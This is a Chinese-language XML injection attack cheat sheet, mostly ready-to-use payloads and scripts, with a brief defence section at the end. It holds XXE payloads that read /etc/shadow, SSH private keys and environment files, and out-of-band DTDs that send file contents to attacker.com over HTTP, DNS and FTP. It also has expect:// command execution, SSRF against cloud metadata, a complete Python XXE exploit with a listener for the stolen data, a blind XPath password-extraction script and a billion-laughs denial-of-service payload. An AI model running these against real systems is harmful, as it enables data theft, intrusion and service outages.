# XML注入攻击 攻击库

## 漏洞概述

XML注入攻击是指应用程序在处理XML数据时,由于缺乏适当的输入验证和输出编码,导致攻击者可以注入恶意XML内容,从而操纵XML文档结构、读取敏感文件、发起拒绝服务攻击甚至执行远程代码。

**主要攻击类型**:
- XXE (XML External Entity) - XML外部实体注入
- XPath注入
- XML炸弹 (Billion Laughs Attack)
- SOAP注入
- XML属性注入

**影响范围**:
- Web应用程序
- Web服务(SOAP/REST)
- 配置文件解析
- 文档处理系统
- 数据传输接口

## XXE (XML外部实体注入)

### 1. 基础XXE - 文件读取

**原理**: XML解析器处理外部实体引用时,会加载并解析外部资源

**漏洞代码示例**:

**Python (lxml)**:
```python
from lxml import etree

# 危险配置
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
xml_data = request.get('xml')
tree = etree.fromstring(xml_data, parser)  # 漏洞!
```

**Java**:
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xml)));  // 漏洞!
```

**PHP**:
```php
libxml_disable_entity_loader(false);  // 危险!
$xml = simplexml_load_string($input);
```

**基础XXE Payload**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

**SVG文件读取**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**读取特定文件**:

```xml
<!-- Linux系统文件 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">

<!-- Windows系统文件 -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">

<!-- 应用文件 -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///app/flag.txt">
```

### 2. 盲XXE - 无回显攻击

**场景**: 应用解析XML但不返回解析结果

**OOB (Out-of-Band) 数据外带**:

**方法1: HTTP外带**:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<root></root>
```

**evil.dtd (托管在攻击者服务器)**:
```xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%payload;
```

**方法2: DNS外带**:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/dns.dtd">
  %dtd;
]>
```

**dns.dtd**:
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com'>">
%all;
```

**方法3: FTP外带**:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/ftp.dtd">
%dtd;
%send;
```

**ftp.dtd**:
```xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:21/%file;'>">
%payload;
```

### 3. XXE进阶利用

**目录列举**:

```xml
<!-- PHP expect:// -->
<!ENTITY xxe SYSTEM "expect://ls">

<!-- PHP file:// -->  
<!ENTITY xxe SYSTEM "file:///var/www/html/">

<!-- Java jar:// -->
<!ENTITY xxe SYSTEM "jar:file:///path/to/file.jar!/file.txt">
```

**端口扫描**:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<root>&xxe;</root>

<!-- 通过响应时间判断端口开放 -->
```

**SSRF via XXE**:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>
<root>&xxe;</root>

<!-- 访问内网服务 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

**RCE via XXE**:

```xml
<!-- PHP expect -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>

<!-- 需要expect扩展 -->
<!ENTITY xxe SYSTEM "expect://cat /flag.txt">
```

### 4. 完整XXE利用脚本

```python
#!/usr/bin/env python3
"""
XXE漏洞利用脚本
"""
import requests
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import base64

class XXEExploiter:
    def __init__(self, target_url, attacker_host):
        self.target = target_url
        self.attacker = attacker_host
        self.data = None
    
    def basic_xxe(self, filepath):
        """基础XXE - 直接读取文件"""
        print(f"[*] 基础XXE攻击 - 读取: {filepath}")
        
        payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root>
  <data>&xxe;</data>
</root>"""
        
        r = requests.post(
            self.target,
            data=payload,
            headers={'Content-Type': 'application/xml'}
        )
        
        if r.status_code == 200:
            print(f"[+] 响应:\n{r.text}")
            return r.text
        else:
            print(f"[-] 请求失败: {r.status_code}")
            return None
    
    def blind_xxe_http(self, filepath):
        """盲XXE - HTTP外带"""
        print(f"[*] 盲XXE攻击 - HTTP外带")
        
        # 启动监听服务器
        self.start_listener()
        
        # 构造DTD
        dtd_content = f"""<!ENTITY % file SYSTEM "file://{filepath}">
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://{self.attacker}/?data=%file;'>">
%payload;"""
        
        # 在attacker服务器上托管evil.dtd
        # 这里简化,实际需要一个HTTP服务器
        
        payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://{self.attacker}/evil.dtd">
  %dtd;
  %send;
]>
<root></root>"""
        
        r = requests.post(
            self.target,
            data=payload,
            headers={'Content-Type': 'application/xml'}
        )
        
        print(f"[*] 等待外带数据...")
        # 数据会发送到监听服务器
    
    def svg_upload_xxe(self, filepath):
        """SVG文件上传XXE"""
        print(f"[*] SVG上传XXE - 读取: {filepath}")
        
        svg_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"""
        
        files = {
            'image': ('malicious.svg', svg_payload, 'image/svg+xml')
        }
        
        r = requests.post(
            f"{self.target}/upload",
            files=files
        )
        
        if r.status_code == 200:
            print(f"[+] 上传成功")
            print(f"[+] 响应:\n{r.text[:500]}")
            return r.text
        else:
            print(f"[-] 上传失败: {r.status_code}")
            return None
    
    def start_listener(self):
        """启动HTTP监听服务器接收外带数据"""
        
        class ListenerHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                # 提取外带的数据
                if '?data=' in self.path:
                    data = self.path.split('?data=')[1]
                    print(f"\n[+] 接收到外带数据:")
                    print(f"{data}\n")
                    
                    # 解码(如果是base64)
                    try:
                        decoded = base64.b64decode(data)
                        print(f"[+] 解码后:\n{decoded.decode()}")
                    except:
                        pass
                
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass  # 禁用日志
        
        server = HTTPServer(('0.0.0.0', 80), ListenerHandler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        print(f"[*] 监听服务器启动: http://{self.attacker}")

# 使用示例
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("用法: python3 xxe_exploit.py <目标URL> <攻击者服务器>")
        print("示例: python3 xxe_exploit.py http://target.com/api http://attacker.com")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker = sys.argv[2]
    
    exploiter = XXEExploiter(target, attacker)
    
    print("[*] XXE漏洞利用工具")
    print("="*60)
    
    # 尝试读取常见敏感文件
    files_to_read = [
        '/etc/passwd',
        '/flag.txt',
        '/app/flag.txt',
        '/var/www/html/config.php'
    ]
    
    for filepath in files_to_read:
        print(f"\n[*] 尝试读取: {filepath}")
        result = exploiter.basic_xxe(filepath)
        
        if result and 'flag{' in result.lower():
            import re
            flag = re.search(r'flag\{[^}]+\}', result, re.I)
            if flag:
                print(f"\n[+] 找到FLAG: {flag.group()}")
                break
```

## XPath注入

### 1. 基础XPath注入

**原理**: 应用拼接用户输入到XPath查询中

**漏洞代码**:

```python
from lxml import etree

username = request.get('username')
password = request.get('password')

# 危险的XPath查询
xpath = f"//user[username/text()='{username}' and password/text()='{password}']"
result = tree.xpath(xpath)
```

**XML数据**:
```xml
<users>
  <user>
    <username>admin</username>
    <password>secretpass</password>
    <role>administrator</role>
  </user>
  <user>
    <username>guest</username>
    <password>guestpass</password>
    <role>user</role>
  </user>
</users>
```

**注入Payload**:

**认证绕过**:
```
username: admin' or '1'='1
password: anything

生成XPath: //user[username/text()='admin' or '1'='1' and password/text()='anything']
```

**提取数据**:
```
username: ' or 1=1]|//user[username/text()='admin
password: anything

生成XPath: //user[username/text()='' or 1=1]|//user[username/text()='admin' and ...]
```

### 2. XPath盲注

**布尔盲注**:

```
# 判断admin用户是否存在
username: ' or count(//user[username='admin'])=1 or '1'='2
# True: 返回结果
# False: 不返回结果

# 提取密码长度
username: ' or string-length(//user[username='admin']/password)=10 or '1'='2

# 提取密码第一个字符
username: ' or substring(//user[username='admin']/password,1,1)='s' or '1'='2
```

**完整盲注脚本**:

```python
#!/usr/bin/env python3
import requests
import string

def xpath_blind_injection(url):
    """XPath盲注提取数据"""
    
    print("[*] XPath盲注攻击")
    
    # 1. 获取密码长度
    password_length = 0
    for length in range(1, 50):
        payload = f"' or string-length(//user[username='admin']/password)={length} or '1'='2"
        
        data = {
            'username': payload,
            'password': 'test'
        }
        
        r = requests.post(url, data=data)
        
        if 'success' in r.text.lower() or r.status_code == 200:
            password_length = length
            print(f"[+] 密码长度: {password_length}")
            break
    
    # 2. 逐字符提取密码
    password = ""
    charset = string.ascii_letters + string.digits + "!@#$%^&*"
    
    for position in range(1, password_length + 1):
        for char in charset:
            payload = f"' or substring(//user[username='admin']/password,{position},1)='{char}' or '1'='2"
            
            data = {
                'username': payload,
                'password': 'test'
            }
            
            r = requests.post(url, data=data)
            
            if 'success' in r.text.lower():
                password += char
                print(f"\r[+] 密码: {password}", end='', flush=True)
                break
    
    print(f"\n[+] 完整密码: {password}")
    return password

# 使用
xpath_blind_injection("http://target.com/login")
```

## XML炸弹 (DoS)

### 1. Billion Laughs Attack

**原理**: 通过递归实体定义创造指数级内存消耗

**Payload**:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

**效果**: 3GB+ 内存消耗

### 2. 外部实体DoS

**无限循环引用**:

```xml
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY % b SYSTEM 'file:///dev/random'>">
  %a;
  %b;
]>
```

**大文件读取**:

```xml
<!ENTITY xxe SYSTEM "file:///dev/zero">
```

## SOAP注入

**原理**: 注入恶意XML到SOAP消息中

**正常SOAP请求**:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login>
      <username>user</username>
      <password>pass</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```

**注入Payload**:

```xml
<username>admin</username><role>administrator</role><dummy>
```

**生成的SOAP**:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login>
      <username>admin</username><role>administrator</role><dummy></username>
      <password>pass</password>
    </Login>
  </soap:Body>
</soap:Envelope>
```

## 综合检测工具

```python
#!/usr/bin/env python3
"""
XML注入综合检测工具
"""
import requests

class XMLVulnScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.findings = []
    
    def test_xxe(self):
        """测试XXE漏洞"""
        print("\n[*] 测试XXE...")
        
        payloads = [
            # 基础XXE
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
            
            # SVG XXE
            """<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg><text>&xxe;</text></svg>""",
        ]
        
        for payload in payloads:
            r = requests.post(
                self.target,
                data=payload,
                headers={'Content-Type': 'application/xml'}
            )
            
            if 'root:' in r.text or any(word in r.text for word in ['daemon', 'bin', 'sys']):
                finding = "发现XXE漏洞 - 可读取文件"
                print(f"  [!] {finding}")
                self.findings.append(finding)
                return True
        
        return False
    
    def test_xpath_injection(self):
        """测试XPath注入"""
        print("\n[*] 测试XPath注入...")
        
        payloads = [
            "' or '1'='1",
            "' or 1=1 or '1'='1",
            "admin' or '1'='1"
        ]
        
        for payload in payloads:
            data = {
                'username': payload,
                'password': 'test'
            }
            
            r = requests.post(self.target, data=data)
            
            if 'success' in r.text.lower() or 'admin' in r.text:
                finding = "可能存在XPath注入"
                print(f"  [!] {finding}")
                self.findings.append(finding)
                return True
        
        return False
    
    def test_xml_bomb(self):
        """测试XML炸弹"""
        print("\n[*] 测试XML炸弹...")
        
        payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
]>
<root>&lol2;</root>"""
        
        import time
        start = time.time()
        
        try:
            r = requests.post(
                self.target,
                data=payload,
                headers={'Content-Type': 'application/xml'},
                timeout=5
            )
            
            elapsed = time.time() - start
            
            if elapsed > 3 or r.status_code == 500:
                finding = "可能容易受到XML炸弹攻击"
                print(f"  [!] {finding}")
                self.findings.append(finding)
                return True
        
        except requests.Timeout:
            finding = "XML炸弹导致超时 - 存在DoS风险"
            print(f"  [!] {finding}")
            self.findings.append(finding)
            return True
        
        return False
    
    def scan(self):
        """执行完整扫描"""
        print(f"[*] 扫描目标: {self.target}")
        print("="*60)
        
        self.test_xxe()
        self.test_xpath_injection()
        self.test_xml_bomb()
        
        print(f"\n[*] 扫描完成")
        print(f"[*] 发现 {len(self.findings)} 个潜在问题")
        
        return self.findings

# 使用
if __name__ == "__main__":
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080/api"
    
    scanner = XMLVulnScanner(target)
    findings = scanner.scan()
```

## 防御措施

### 1. 禁用外部实体

**Python (lxml)**:
```python
from lxml import etree

# 安全的解析器配置
parser = etree.XMLParser(
    resolve_entities=False,  # 禁用实体解析
    no_network=True,         # 禁用网络访问
    load_dtd=False          # 禁用DTD加载
)

tree = etree.fromstring(xml_data, parser)
```

**Java**:
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// 禁用外部实体
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

DocumentBuilder builder = factory.newDocumentBuilder();
```

**PHP**:
```php
libxml_disable_entity_loader(true);  // 禁用外部实体加载
$xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NOENT);
```

### 2. 使用JSON代替XML

```python
# 避免XML处理
import json

data = request.get('data')
obj = json.loads(data)  # 使用JSON
```

### 3. 输入验证

```python
def validate_xml(xml_string):
    """验证XML输入"""
    
    # 检查危险关键字
    dangerous_keywords = [
        '<!ENTITY', 'SYSTEM', 'PUBLIC',
        '<!DOCTYPE', 'file://', 'http://',
        'expect://', 'php://'
    ]
    
    xml_upper = xml_string.upper()
    
    for keyword in dangerous_keywords:
        if keyword.upper() in xml_upper:
            raise ValueError(f"检测到危险关键字: {keyword}")
    
    return True
```

### 4. 使用白名单

```python
# XPath参数化查询
def safe_xpath_query(username, password):
    # 使用XPath变量
    xpath = "//user[username/text()=$username and password/text()=$password]"
    
    # 绑定变量
    result = tree.xpath(xpath, username=username, password=password)
    
    return result
```

## 参考资源

- [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [XXE PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [XML Bomb Wikipedia](https://en.wikipedia.org/wiki/Billion_laughs_attack)

---

**最后更新**: 2025-11-16
**适用场景**: Web服务、API、文件上传、数据处理
**攻击难度**: 简单到中等
**检测难度**: 需要测试不同的XML处理场景
